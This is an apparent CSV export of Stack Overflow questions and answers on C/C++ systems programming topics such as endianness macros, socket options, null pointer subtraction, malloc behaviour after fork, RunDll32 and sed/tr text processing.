","9530","Adam Rosenfield","<pre><code>#include &lt;stdio.h&gt;

int main(void)
{
    printf(""%d\n"", (int)sizeof('a'));
    return 0;
}
</code></pre>

<p>In C, this prints whatever the value of <code>sizeof(int)</code> is on the current system, which is typically <code>4</code> in most systems commonly in use today.</p>

<p>In C++, this must print 1.</p>
"
"<p>Is there a safe, portable way to determine (during compile time) the endianness of the platform that my program is being compiled on? I'm writing in C.</p>

<p>[EDIT]
Thanks for the answers, I decided to stick with the runtime solution!</p>
","9530","","<p>To answer the original question of a <em>compile-time</em> check, there's no standardized way to do it that will work across all existing and all future compilers, because none of the existing C, C++, and POSIX standards define macros for detecting endianness.</p>

<p>But, if you're willing to limit yourself to some known set of compilers, you can look up each of those compilers' documentations to find out which predefined macros (if any) they use to define endianness.  <a href=""http://sourceforge.net/p/predef/wiki/Endianness/"" rel=""nofollow"">This page</a> lists several macros you can look for, so here's some code which would work for those:</p>

<pre><code>#if defined(__BYTE_ORDER) &amp;&amp; __BYTE_ORDER == __BIG_ENDIAN || \
    defined(__BIG_ENDIAN__) || \
    defined(__ARMEB__) || \
    defined(__THUMBEB__) || \
    defined(__AARCH64EB__) || \
    defined(_MIBSEB) || defined(__MIBSEB) || defined(__MIBSEB__)
// It's a big-endian target architecture
#elif defined(__BYTE_ORDER) &amp;&amp; __BYTE_ORDER == __LITTLE_ENDIAN || \
    defined(__LITTLE_ENDIAN__) || \
    defined(__ARMEL__) || \
    defined(__THUMBEL__) || \
    defined(__AARCH64EL__) || \
    defined(_MIPSEL) || defined(__MIPSEL) || defined(__MIPSEL__)
// It's a little-endian target architecture
#else
#error ""I don't know what architecture this is!""
#endif
</code></pre>

<p>If you can't find what predefined macros your compiler uses from its documentation, you can also try coercing it to spit out its full list of predefined macros and guess from there what will work (look for anything with ENDIAN, ORDER, or the processor architecture name in it).  <a href=""http://nadeausoftware.com/articles/2011/12/c_c_tip_how_list_compiler_predefined_macros"" rel=""nofollow"">This page</a> lists a number of methods for doing that in different compilers:</p>

<pre><code>Compiler                   C macros                         C++ macros
Clang/LLVM                 clang -dM -E -x c /dev/null      clang++ -dM -E -x c++ /dev/null
GNU GCC/G++                gcc   -dM -E -x c /dev/null      g++     -dM -E -x c++ /dev/null
Hewlett-Packard C/aC++     cc    -dM -E -x c /dev/null      aCC     -dM -E -x c++ /dev/null
IBM XL C/C++               xlc   -qshowmacros -E /dev/null  xlc++   -qshowmacros -E /dev/null
Intel ICC/ICPC             icc   -dM -E -x c /dev/null      icpc    -dM -E -x c++ /dev/null
Microsoft Visual Studio (none)                              (none)
Oracle Solaris Studio      cc    -xdumpmacros -E /dev/null  CC      -xdumpmacros -E /dev/null
Portland Group PGCC/PGCPP  pgcc  -dM -E                     (none)
</code></pre>

<p>Finally, to round it out, the Microsoft Visual C/C++ compilers are the odd ones out and don't have any of the above.  Fortunately, they have documented their predefined macros <a href=""http://msdn.microsoft.com/en-us/library/b0084kay%28v=vs.110%29.aspx"" rel=""nofollow"">here</a>, and you can use the target processor architecture to infer the endianness.  While all of the currently supported processors in Windows are little-endian (<code>_M_IX86</code>, <code>_M_X64</code>, <code>_M_IA64</code>, and <code>_M_ARM</code> are little-endian), some historically supported processors like the PowerPC (<code>_M_PPC</code>) were big-endian.  But more relevantly, the Xbox 360 is a big-endian PowerPC machine, so if you're writing a cross-platform library header, it can't hurt to check for <code>_M_PPC</code>.</p>
"
"<p>Suppose the listening socket passed to <code>accept</code> has non-default options set on it with <code>setsockopt</code>. Are these options (some or all of them?) inherited by the resulting file descriptors for accepted connections?</p>
","9530","","<p>No, they're not necessarily inherited.  Try this sample, which sets the receive buffer size (<code>SO_RCVBUF</code>) on the initial socket to a non-default value and then compares the result with the inherited socket.  Run this code, which listens on TCP port 12345, and then connect to it from any other program.</p>

<pre><code>#include &lt;errno.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/socket.h&gt;

void die(const char *f)
{
  printf(""%s: %s\n"", f, strerror(errno));
  exit(1);
}

int main(void)
{
  int s = socket(AF_INET, SOCK_STREAM, 0);
  if(s &lt; 0)
    die(""socket"");

  int rcvbuf;
  socklen_t optlen = sizeof(rcvbuf);
  if(getsockopt(s, SOL_SOCKET, SO_RCVBUF, &amp;rcvbuf, &amp;optlen) &lt; 0)
    die(""getsockopt (1)"");
  printf(""initial rcvbuf: %d\n"", rcvbuf);
  rcvbuf *= 2;
  if(setsockopt(s, SOL_SOCKET, SO_RCVBUF, &amp;rcvbuf, sizeof(rcvbuf)) &lt; 0)
    die(""setsockopt"");
  printf(""set rcvbuf to %d\n"", rcvbuf);

  struct sockaddr_in sin;
  memset(&amp;sin, 0, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_port = htons(12345);
  sin.sin_addr.s_addr = INADDR_ANY;
  if(bind(s, (struct sockaddr *)&amp;sin, sizeof(sin)) &lt; 0)
    die(""bind"");

  if(listen(s, 10) &lt; 0)
    die(""listen"");

  struct sockaddr_in client_addr;
  socklen_t addr_len = sizeof(client_addr);
  int s2 = accept(s, (struct sockaddr *)&amp;client_addr, &amp;addr_len);
  if(s2 &lt; 0)
    die(""accept"");
  printf(""accepted connection\n"");
  optlen = sizeof(rcvbuf);
  if(getsockopt(s2, SOL_SOCKET, SO_RCVBUF, &amp;rcvbuf, &amp;optlen) &lt; 0)
    die(""getsockopt (2)"");

  printf(""new rcvbuf: %d\n"", rcvbuf);

  return 0;
}
</code></pre>

<p>Result on a machine running Linux 3.0.0-21-generic:</p>

<pre><code>initial rcvbuf: 87380
set rcvbuf to 174760
accepted connection
new rcvbuf: 262142
</code></pre>
"
"<p>Is the difference of two non-void pointer variables defined (per C99 and/or C++98) if they are both <code>NULL</code> valued?</p>

<p>For instance, say I have a buffer structure that looks like this:</p>

<pre><code>struct buf {
  char *buf;
  char *pwrite;
  char *pread;
} ex;
</code></pre>

<p>Say, <code>ex.buf</code> points to an array or some malloc'ed memory. If my code always ensures that <code>pwrite</code> and <code>pread</code> point within that array or one past it, then I am fairly confident that <code>ex.pwrite - ex.pread</code> will always be defined. However, what if <code>pwrite</code> and <code>pread</code> are both NULL. Can I just expect subtracting the two is defined as <code>(ptrdiff_t)0</code> or does strictly compliant code need to test the pointers for NULL? Note that the only case I am interested in is when <em>both</em> pointers are NULL (which represents a buffer not initialized case). The reason has to do with a fully compliant ""available"" function given the preceding assumptions are met:</p>

<pre><code>size_t buf_avail(const struct s_buf *b)
{     
    return b-&gt;pwrite - b-&gt;pread;
}
</code></pre>
","9530","","<p>In C99, it's technically undefined behavior.  C99 §6.5.6 says:</p>

<blockquote>
  <p>7) For the purposes of these operators, a pointer to an object that is not an element of an
  array behaves the same as a pointer to the first element of an array of length one with the
  type of the object as its element type.</p>
  
  <p>[...]</p>
  
  <p>9) When two pointers are subtracted, both shall point to elements of the same array object,
  or one past the last element of the array object; the result is the difference of the
  subscripts of the two array elements. [...]</p>
</blockquote>

<p>And §6.3.2.3/3 says:</p>

<blockquote>
  <p>An integer constant expression with the value 0, or such an expression cast to type
  <code>void *</code>, is called a null pointer constant.<sup>55)</sup> If a null pointer constant is converted to a pointer type, the resulting pointer, called a <em>null pointer</em>, is guaranteed to compare unequal to a pointer to any object or function.</p>
</blockquote>

<p>So since a null pointer is unequal to any object, it violates the preconditions of 6.5.6/9, so it's undefined behavior.  But in practicality, I'd be willing to bet that pretty much every compiler will return a result of 0 without any ill side effects.</p>

<p>In C89, it's also undefined behavior, though the wording of the standard is slightly different.</p>

<p>C++03, on the other hand, does have defined behavior in this instance.  The standard makes a special exception for subtracting two null pointers.  C++03 §5.7/7 says:</p>

<blockquote>
  <p>If the value 0 is added to or subtracted from a pointer value, the result compares equal to the original pointer value. If two pointers point to the same object or both point one past the end of the same array or both are null, and the two pointers are subtracted, the result compares equal to the value 0 converted to the type <code>ptrdiff_t</code>.</p>
</blockquote>

<p>C++11 (as well as the latest draft of C++14, n3690) have identical wording to C++03, with just the minor change of <code>std::ptrdiff_t</code> in place of <code>ptrdiff_t</code>.</p>
"
"<p>I have the following header file:</p>

<pre><code>typedef struct my_data my_data_t;
my_data_t* new_my_data(void);
void free_my_data(my_data_t* my_data);
</code></pre>

<p>And the corresponding c file:</p>

<pre><code>typedef struct my_data
{
  int val;
} my_data_t;

my_data_t* new_my_data()
{
  my_data_t* ptr = (my_data_t*)malloc(sizeof(my_data_t));
  return ptr;
}

void free_my_data(my_data_t* my_data)
{
  free(my_data);
}
</code></pre>

<p>I would like to create in instance of my_data_t in static memory without using malloc. I'd like to do this by adding the following to the header file:</p>

<pre><code>int sizeof_my_data(void);
</code></pre>

<p>...and this to the c file:</p>

<pre><code>int sizeof_my_data()
{
  return sizeof(my_data_t);
}
</code></pre>

<p>...and doing something like this:</p>

<pre><code>static my_data_t* my_data_instance = static_alloc(sizeof_my_data());
</code></pre>

<p>Is this possible? <strong>I'd like to do this because the target machine for this code is a microprocessor that doesn't handle malloc (in our case, it's best that all structures be held in static memory), and I'd like to keep the actual data structure of my_data hidden from the code that implements it.</strong> Any other suggestions on how to accomplish the goal are welcome. Thanks.</p>
","9530","","<p>The usual way of doing this is to create an opaque struct in your header file with the correct size.  For example:</p>

<pre><code>#define MY_DATA_SIZE 32
struct my_data_t
{
    char opaque_data[MY_DATA_SIZE];
};
</code></pre>

<p>This is how the various pthreads data types (such as <code>pthread_mutex_t</code>) are defined.</p>
"
"<p>I want to delete text from multiple files. It could be from 10 to 1000 files, so deleting it by hand is too much work. 
I found a couple of SO questions, such as:
<a href=""http://stackoverflow.com/questions/6405642/delete-specific-lines-in-multiple-text-files-with-freeware-app"">Delete specific lines in multiple Text Files with freeware App?</a> but none of them helped</p>

<p>To do find and replace, I could write a perl command, but it lacks options.
For example, I want to delete the first four lines in all files.
Does anyone know a solution? Or maybe an app? I would prefer something without VBScript.</p>
","9530","","<p><a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man1/sed.1.html"" rel=""nofollow""><code>sed(1)</code></a> or <a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man1/awk.1.html"" rel=""nofollow""><code>awk(1)</code></a> would be great for this job.  For example, to delete the first 4 lines of all of the <code>.txt</code> files in the current directory:</p>

<pre><code>sed -i~ 1,4d *.txt
</code></pre>

<p>This will delete the first 4 lines of all <code>.txt</code> files anywhere in a subdirectory of the current directory:</p>

<pre><code>find . -type f -iname \*.txt -exec sed -i~ 1,4d '{}' +
</code></pre>
"
"<p>In one of my recent projects I happened to have in the same process (a Python program, its a multithreaded application):</p>

<ul>
<li><p>a Boost::Python module to a library that linked against the <a href=""http://www.alliedvisiontec.com/us/products/software/linux/gige-linux-sdk.html"" rel=""nofollow"">AVT PvAPI SDK</a>, i.e. in the widest sense a driver to get image frames from a camera. This library (the PvApi SDK) produces a <a href=""http://en.wikipedia.org/wiki/SIGALRM"" rel=""nofollow"">SIGALRM</a> internally every some milliseconds.</p></li>
<li><p>another plain Python module that was intended to do some serial I/O using <a href=""http://pyserial.sourceforge.net/"" rel=""nofollow"">pyserial</a>. This in turn uses Python's wrapper <a href=""http://docs.python.org/library/select.html"" rel=""nofollow"">select.select</a> to POSIX <a href=""http://linux.die.net/man/2/select"" rel=""nofollow"">select</a>. Which turned out to be interrupted (<code>errno == EINTR</code>) everytime the signal is produced by the other module.</p></li>
<li><p>the same issue could be observed on any call of Python's <a href=""http://docs.python.org/library/time.html"" rel=""nofollow"">time.sleep</a>, resp. the POSIX <a href=""http://linux.die.net/man/3/sleep"" rel=""nofollow"">sleep</a>, that is used internally.</p></li>
</ul>

<p>These issues are apparantly not present in Windows, as sleep and select will not be interrupted by any signal there (according to the documentation). And these issues are not much of a problem in C/C++, as you can (and should, though) restart the calls if they have been interrupted. </p>

<p>However, as the Python implementation (<a href=""http://www.python.org/getit/"" rel=""nofollow"">source code</a>/Modules/selectmodule.c) doesn't handle this case (<code>EINTR</code>), am I forced to implement my own C/C++ serial driver and sleep function to use in Python? Or to move away from Python for this project? As Python makes programming so much easier I'm very interested if anyone has had similar problems and found a nice workaround or simple fix for this. Right now I don't have the capacity to work out the necessary fixes for the Python modules myself. Or maybe I have missed some other option?</p>

<p>Any ideas?</p>
","9530","","<p>Try using <a href=""http://docs.python.org/library/signal.html#signal.siginterrupt"" rel=""nofollow""><code>signal.sigintterupt</code></a> to make the <code>SIGALRM</code> signal restart system calls automatically.  Or you could use <a href=""http://docs.python.org/library/signal.html#signal.signal"" rel=""nofollow""><code>signal.signal(signal.SIGALRM, signal.SIG_IGN)</code></a> to ignore the alarm signal, assuming you're not using it for anything.</p>
"
"<p>Is <strong>malloc</strong> deterministic? Say If I have a forked process, that is, a replica of another process, and at some point both of them call the <strong>malloc</strong> function. Would the address allocated be the same in both processes? Assuming that other parts of execution are also deterministic.</p>

<p>Note: Here, I'm only talking about virtual memory, not physical one.</p>
","9530","","<p>That depends entirely on the <code>malloc</code> implementation.  There's no inherent reason why a particular <code>malloc</code> implementation would introduce non-determinism (except possibly as an application fuzzing test, but even then it ought to be disabled by default).  For example, <a href=""http://g.oswego.edu/dl/html/malloc.html"" rel=""nofollow"">Doug Lea's <code>malloc</code></a> does not use <code>rand(3)</code> or any similar methods in it.</p>

<p>But, since <code>malloc</code> makes calls to the kernel such as <a href=""http://linux.die.net/man/2/sbrk"" rel=""nofollow""><code>sbrk(2)</code></a> or <a href=""http://linux.die.net/man/2/mmap"" rel=""nofollow""><code>mmap(2)</code></a> on Linux or <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa366887%28v=vs.85%29.aspx"" rel=""nofollow""><code>VirtualAlloc</code></a> on Windows, those system calls may not always be deterministic, even in otherwise identical processes.  The kernel may decide to intentionally provide different <code>mmap</code>'ed addresses in different processes for whatever reason.</p>

<p>So for small allocations, which are usually serviced in user space without a system call, it will quite likely be the case that the resulting pointers will be the same after a <code>fork()</code>; large allocations that are serviced by a system a call can be the same.</p>

<p>In general, though, do not depend on it.  If you really need identical pointers in separate processes, either create them before forking, or use shared memory and share them appropriately.</p>
"
"<p>I'm trying to use stl sort() in a class function.  I would like to sort an array of structs that look like this:</p>

<pre><code>struct foo{
    double num;
    std::string s;
};
</code></pre>

<p>with a comparison function like this:</p>

<pre><code>bool aGreaterThanb(foo a, foo b){
    if (a.num &gt; b.num){
        if(a.num == b.num){
            if (anotherOutsideComparison(a.s, b.s)){
                return true;
            }
        }
        else
            return true;
    }
    else
        return false;
}
</code></pre>

<p>But I'm not sure how I can format this to get it to compile.  How should I format this so I can call <code>sort(fooarray[0], fooarray[end], aGreaterThanb);</code>? (An example would be great)</p>
","9530","","<p>Write your comparison function as the <code>operator()</code> method of a structure called a <em>functor</em>:</p>

<pre><code>struct aGreaterThanb
{
    bool operator() (const foo&amp; a, const foo&amp; b)
    {
        // return true iff a is strictly less than b according to your ordering
    }
};
</code></pre>

<p>Then pass an instance of that functor object to <code>std::sort</code>:</p>

<pre><code>std::sort(fooarray.begin(), fooarray.end(), aGreaterThanb());
</code></pre>
"
"<p>I am writing a client-server application, and it uses POSIX <code>poll</code> function to provide a form of concurrent client handling. Clients also have state and other related data, which is stored in a client structure. </p>

<p>My immediate problem is that when I get a hint from <code>poll</code> to do I/O on a socket file descriptor that is associated with a client (conceptually), I have to actually match the file descriptor to its associated client data structure. Currently I do a <code>O(n_clients)</code> lookup (my client data structure stores the descriptor), but I was wondering whether there exists a better alternative?</p>
","9530","","<p>No.  If there were, it would have to be tracked by the kernel, and looking up that data would therefore involve a system call.  The cost of a system call is an order of magnitude more expensive than doing an O(n) lookup in user space.</p>

<p>How many clients are you dealing with at once?  Unless it's on the order of hundreds or more, the cost of a lookup is going to be miniscule compared to the cost of doing any sort of I/O.</p>

<p>Instead of using an O(n) lookup, you could also just use an array indexed by the file descriptor, assuming you won't have more than a certain number of descriptors open at once.  For example:</p>

<pre><code>#define MY_MAX_FD 1024  // Tune this to your needs
void *per_fd_data[MY_MAX_FD];

void *get_per_fd_data(int fd)
{
    assert(fd &gt;= 0);
    if(fd &lt; MY_MAX_FD)
        return per_fd_data[fd];
    else
    {
        // Look up fd in a dynamic associative array (left as an exercise to the
        // reader)
    }
}
</code></pre>
"
"<p>Firstly, I'm aware that opening a file with fopen() and not closing it is horribly irresponsible, and bad form. This is just sheer curiosity, so please humour me :)</p>

<p>I know that if a C program opens a bunch of files and never closes any of them, eventually fopen() will start failing. Are there any other side effects that could cause problems outside the code itself? For instance, if I have a program that opens one file, and then exits without closing it, could that cause a problem for the person running the program? Would such a program leak anything (memory, file handles)? Could there be problems accessing that file again once the program had finished? What would happen if the program was run many times in succession?</p>
","9530","","<p>As long as your program is running, if you keep opening files without closing them, the most likely result is that you will run out of file descriptors/handles available for your process, and attempting to open more files will fail eventually.  On Windows, this can also prevent other processes from opening or deleting the files you have open, since by default, files are opened in an exclusive sharing mode that prevents other processes from opening them.</p>

<p>Once your program exits, the operating system will clean up after you.  It will close any files you left open when it terminates your process, and perform any other cleanup that is necessary (e.g. if a file was marked delete-on-close, it will delete the file then; note that that sort of thing is platform-specific).</p>

<p>However, another issue to be careful of is <strong>buffered data</strong>.  Most file streams buffer data in memory before writing it out to disk.  If you're using <code>FILE*</code> streams from the stdio library, then there are two possibilities:</p>

<ol>
<li>Your program exited normally, either by calling the <a href=""http://linux.die.net/man/3/exit""><code>exit(3)</code></a> function, or by returning from <code>main</code> (which implicitly calls <code>exit(3)</code>).</li>
<li>Your program exited abnormally; this can be via calling <a href=""http://linux.die.net/man/3/abort""><code>abort(3)</code></a> or <a href=""http://linux.die.net/man/3/_exit""><code>_Exit(3)</code></a>, dying from a signal/exception, etc.</li>
</ol>

<p>If your program exited normally, the C runtime will take care of flushing any buffered streams that were open.  So, if you had buffered data written to a <code>FILE*</code> that wasn't flushed, it will be flushed on normal exit.</p>

<p>Conversely, if your program exited abnormally, any buffered data will <em>not</em> be flushed.  The OS just says ""oh dear me, you left a file descriptor open, I better close that for you"" when the process terminates; it has no idea there's some random data lying somewhere in memory that the program intended to write to disk but did not.  So be careful about that.</p>
"
"<p>I have a file named <em>file1</em> with following content:</p>

<pre><code>The answer t
o your question 

A conclusive a
nswer isn’t al
ways possible.

When in doubt, ask pe
ople to cite their so
urces, or to explain

Even if we don’t agre
e with you, or tell y
ou.
</code></pre>

<p>I would like to convert <em>file1</em> into <em>file2</em>. Latter should look like this:</p>

<pre><code>The answer to your question

A conclusive answer isn’t always possible.

When in doubt, ask people to cite their sources, or to explain

Even if we don’t agree with you, or tell you.
</code></pre>

<p>In case I simply execute <code>cat file1 | tr -d ""\n"" &gt; file2""</code>, all the <em>newline</em> characters will be deleted. Ho do delete only those <em>newline</em> characters, which are on the non-empty lines using the <code>tr(1)</code> utility?</p>
","9530","","<p>If there's a character that you know doesn't appear in your input, you could do something like this:</p>

<pre><code># Assume that the input doesn't contain the '|' character at all
tr '\n' '|' &lt; file1 | sed 's/\([^|]\)|\([^|]\)/\1\2/g' | tr '|' '\n' &gt; file2
</code></pre>

<p>This replaces all newlines with the replacement character <code>|</code>; <code>sed</code> then deletes all instances of <code>|</code> that come after and before some other character; and finally, it replaces <code>|</code> back with newlines.</p>
"
"<p>Is there any way to ping a specific IP address with C?
If I wanted to ping ""www.google.com"" with a certain number of pings, or for that matter, a local address, I would need a program to do that. How can I ping from C?</p>
","9530","","<p>You could craft your own <a href=""http://en.wikipedia.org/wiki/Internet_Control_Message_Protocol"">ICMP packets</a> using <a href=""http://mixter.void.ru/rawip.html"">raw sockets</a>, but that's far from trivial.  The <a href=""http://www.skbuff.net/iputils/"">source code for <code>ping(1)</code></a> is a good place to start on figuring out how to do that (it uses a BSD-like license; see the source code for the full license).  Keep in mind that raw sockets require root privileges on Linux, so your program will need to be setuid root.</p>

<p>Of course, it's much easier to shell out to the <code>ping(1)</code> executable and not have to deal with any of this yourself.  You won't have to worry about code licensing, and your program won't need root privileges (assuming it doesn't already need them for something else).  <a href=""http://linux.die.net/man/3/system""><code>system(3)</code></a>, <a href=""http://linux.die.net/man/3/popen""><code>popen(3)</code></a>, and <a href=""http://linux.die.net/man/3/fork""><code>fork(3)</code></a>/<a href=""http://linux.die.net/man/3/exec""><code>exec(3)</code></a> are your friends.</p>
"
"<p>How exactly does RunDll32 call a function, without knowing the number/types of arguments that the function can take?</p>

<p>Does it have a built-in compiler or something of the sort?</p>
","9530","","<p>RunDll32 is pretty much a thin wrapper that calls <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684175%28v=vs.85%29.aspx""><code>LoadLibrary</code></a> to load the given DLL, calls <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms683212%28v=vs.85%29.aspx""><code>GetProcAddress</code></a> to get the function address of the desired function, and then calls the function.</p>

<p>It can't call just any exported function in the DLL, though—it assumes that the function has a very specific function signature of the following:</p>

<pre><code>  void CALLBACK
  EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
</code></pre>

<p>where <code>CALLBACK</code> is a macro that expands to the <code>__stdcall</code> calling convention.  See <a href=""http://support.microsoft.com/kb/164787"">this knowledge base article</a> for a more detailed description.</p>

<p>If your DLL's function does not have the correct signature or calling convention, lots of badness will ensue.  See <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2004/01/15/58973.aspx"">What can go wrong when you mismatch the calling convention?</a> for lots of gory details.  Fortunately (or perhaps unfortunately), <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2011/09/09/10208136.aspx"">RunDll32 is written in such a way to ameliorate those types of errors</a>, but that still doesn't mean it's a good idea.  <strong>Do not use RunDll32 to call functions that do not have the correct signature</strong>.  It's just a ticking time bomb waiting to go off in the next version of Windows.</p>
"
"<p>I have this code:</p>

<pre><code>unsigned short (*pixel_array)[SCREEN_HEIGHT] = get_ok_zone(mouse_mask); 
unsigned short (*pixel_border)[2] = get_ok_zone_border(pixel_array); 
</code></pre>

<p>that gets me access to both of these data arrays. </p>

<p>I need to somehow pass both of these arrays as ONE argument to a function. </p>

<p>Not only can I not figure out how to pass them, I can't figure out how to access the arrays individually once I get them into the function. </p>

<p>I have been trying all day to understand this, and it just seems to be escaping me. </p>

<p>Can someone explain to me what exactly I need to do to pass both of these arrays through one argument (probably in an array of pointers?) to a function, and how to access them on the inside of the function?</p>

<p><strong>edit:</strong> I'm passing the argument (the only argument I am allowed to pass) to a <a href=""http://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html#//apple_ref/c/func/CGEventTapCreate"" rel=""nofollow"">Quartz Event Tap callback.</a> </p>

<p><strong>edit 2:</strong>
@Kevin</p>

<p>I created the struct:</p>

<pre><code>struct array_stack {
    unsigned short (*pixel_array)[SCREEN_HEIGHT]; 
    unsigned short (*pixel_border)[2]; 
};
</code></pre>

<p>Then, in my int main() I have:</p>

<pre><code>struct array_stack as = {get_ok_zone(mouse_mask), get_ok_zone_border(get_ok_zone(mouse_mask))};



CFRunLoopSourceRef runLoopSource;
CGEventMask event_mask;
event_mask = CGEventMaskBit(kCGEventMouseMoved) | CGEventMaskBit(kCGEventLeftMouseDragged) | CGEventMaskBit(kCGEventRightMouseDragged) | CGEventMaskBit(kCGEventOtherMouseDragged);

CGSetLocalEventsSuppressionInterval(0);

CFMachPortRef eventTap = CGEventTapCreate(kCGHIDEventTap, kCGHeadInsertEventTap, 0, event_mask, mouse_filter, as);
</code></pre>

<p>(I pass the <code>as</code> as the very last argument for the <code>CGEventTapCreate()</code> at the bottom of the code block);</p>

<p>I get an error <code>passing struct array_stack to a parameter of incompatible type 'void'</code> , the error points me to this:</p>

<pre><code>CG_EXTERN CFMachPortRef CGEventTapCreate(CGEventTapLocation tap,
CGEventTapPlacement place, CGEventTapOptions options,
CGEventMask eventsOfInterest, CGEventTapCallBack callback,
void *userInfo) CG_AVAILABLE_STARTING(__MAC_10_4, __IPHONE_NA);
</code></pre>

<p><code>void *userInfo</code> is the parameter that receives my argument, which eventually gets passed through to the callback function.</p>
","9530","","<p>Expanding on <a href=""http://stackoverflow.com/q/8235814/9530"">Kevin's answer</a>, the way you do this is with a pointer to a structure.  You do have to be careful about object lifetimes, however: the structure has to continue to stay valid for as long as the data may be accessed.</p>

<p>If you can guarantee the lifetime of when the data may be accessed, you can use a stack variable or a global variable:</p>

<pre><code>typedef struct pixel_data
{
    unsigned short (*pixel_array)[SCREEN_HEIGHT];
    unsigned short (*pixel_border)[2];
} pixel_data;

...

pixel_data data = {get_ok_zone(mouse_mask), get_ok_zone_border(pixel_array)};
CGEventTapCreate(..., &amp;mouse_filter, &amp;data);
// 'data' must remain alive for as long as mouse_filter might get called

...

CGEventRef mouse_filter(..., void *refcon)
{
    pixel_data *data = refcon;  // implicit cast
    // do stuff with data-&gt;pixel_array and data-&gt;pixel_border
}
</code></pre>

<p>If you only have one callback alive at any given time, you can use a global object (and in that case, you actually don't even need to pass the data via the <code>void*</code> parameter—you can just access the global data from the callback).</p>

<p>More likely, if you have multiple callbacks in flight with potentially different data, the only safe thing to do is to <code>malloc</code> each callback's data when created and <code>free</code> it when done:</p>

<pre><code>pixel_data *data = malloc(sizeof(pixel_data));
data-&gt;pixel_array = ...;
data-&gt;pixel_border = ...;
CGEventTapCreate(..., &amp;mouse_filter, data);
...
// When the event is deleted/done/whatever:
free(data);  // The callback mouse_filter should never be called after this
             // with this data
</code></pre>
"
"<p>I need to get a handle to a Window and then move it to my secondary monitor. Is this doable with python 2.6, preferably using the standard libraries.</p>
","9530","","<p>Use the <a href=""http://sourceforge.net/projects/pywin32/"">pywin32</a> module to access the native Win32 API.  The functions you'll need to use are:</p>

<ul>
<li><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms633497%28v=vs.85%29.aspx""><code>EnumWindows</code></a> to enumerate all of the top-level windows in the system; search for the one you want and save off the window handle</li>
<li><a href=""http://msdn.microsoft.com/en-us/library/dd162610%28v=vs.85%29.aspx""><code>EnumDisplayMonitors</code></a> to enumerate all of the monitors in the system</li>
<li><a href=""http://msdn.microsoft.com/en-us/library/dd144901%28v=VS.85%29.aspx""><code>GetMonitorInfo</code></a> to get the virtual display coordinates of a monitor and to determine whether or not each monitor is the primary monitor</li>
<li><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms633534%28v=vs.85%29.aspx""><code>MoveWindow</code></a> to move the window to the desired virtual display coordinates, using the window handle you found earlier</li>
</ul>
"
"<p>I have a recursive <code>struct</code> which is:</p>

<pre><code>typedef struct dict dict;
struct dict {
    dict *children[M];
    list *words[M];
};
</code></pre>

<p>Initialized this way:</p>

<pre><code>dict *d = malloc(sizeof(dict));
bzero(d, sizeof(dict));
</code></pre>

<p>I would like to know what <code>bzero()</code> exactly does here, and how can I <code>malloc()</code> recursively for children.</p>

<p><strong>Edit</strong>: This is how I would like to be able to <code>malloc()</code> the <code>children</code> and <code>words</code>:</p>

<pre><code>void dict_insert(dict *d, char *signature, unsigned int current_letter, char *w) {
    int occur;
    occur = (int) signature[current_letter];
    if (current_letter == LAST_LETTER) {
        printf(""word found : %s!\n"",w);
        list_print(d-&gt;words[occur]);
        char *new;
        new = malloc(strlen(w) + 1);
        strcpy(new, w);
        list_append(d-&gt;words[occur],new);
        list_print(d-&gt;words[occur]);
    }
    else {
        d = d-&gt;children[occur];
        dict_insert(d,signature,current_letter+1,w);
    }
}
</code></pre>
","9530","","<p><a href=""http://linux.die.net/man/3/bzero"" rel=""nofollow""><code>bzero(3)</code></a> initializes the memory to zero.  It's equivalent to calling <a href=""http://linux.die.net/man/3/memset"" rel=""nofollow""><code>memset(3)</code></a> with a second parameter of 0.  In this case, it initializes all of the member variables to null pointers.  <code>bzero</code> is considered deprecated, so you should replace uses of it with <code>memset</code>; alternatively, you can just call <a href=""http://linux.die.net/man/3/calloc"" rel=""nofollow""><code>calloc(3)</code></a> instead of <code>malloc</code>, which automatically zeroes out the returned memory for you upon success.</p>

<p>You should not use either of the two casts you have written—in C, a <code>void*</code> pointer can be implicitly cast to any other pointer type, and any pointer type can be implicitly cast to <code>void*</code>.  <code>malloc</code> returns a <code>void*</code>, so you can just assign it to your <code>dict *d</code> variable without a cast.  Similarly, the first parameter of <code>bzero</code> is a <code>void*</code>, so you can just pass it your <code>d</code> variable directly without a cast.</p>

<p>To understand recursion, you must first understand recursion.  Make sure you have an appropriate base case if you want to avoid allocating memory infinitely.</p>
"
"<p>I am looking for a way to convert from NSString to a class instance variable.  For sample code below, say filter is ""colorFilter"".  I want filternameclassinstancegohere to be replaced with colorFilter. </p>

<pre><code>- (void)filterSelected:(NSString *)filter
{
    self.filternameclassinstancegohere = ….;
}
</code></pre>
","9530","","<p>If the filter value can only be a small, constant number of things, just use an enumeration and a switch statement:</p>

<pre><code>enum Filter
{
  ColorFilter,
  FooFilter,
  BarFilter
};

- (void)filterSelected:(Filter)filter
{
  switch(filter)
  {
  case ColorFilter:
    self.colorFilter = ...;
    break;
  case FooFilter:
    self.fooFilter = ...;
    break;
  case BarFilter:
    self.barFilter = ...;
    break;
  }
}
</code></pre>

<p>If the set of filter values is large and could change frequently, then you could also use <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/KeyValueCoding/Articles/KeyValueCoding.html"" rel=""nofollow"">Key-Value Coding</a>.  It's more complicated but more flexible.</p>
"
"<p>I've implemented iAP in my app, but the English confirmation dialog is not very friendly to Chinese users. I tested iAP in sandbox, whatever I changed the system language, the dialog only displayed in English, but the product name was localized.</p>

<p>The dialog text looks like below.</p>

<pre>
Confirm Your In App Purchase
Do you want to buy one [product name in Chinese] for [price in Chinese]?
</pre>

<p>Does anyone know how to localize the rest of text?</p>
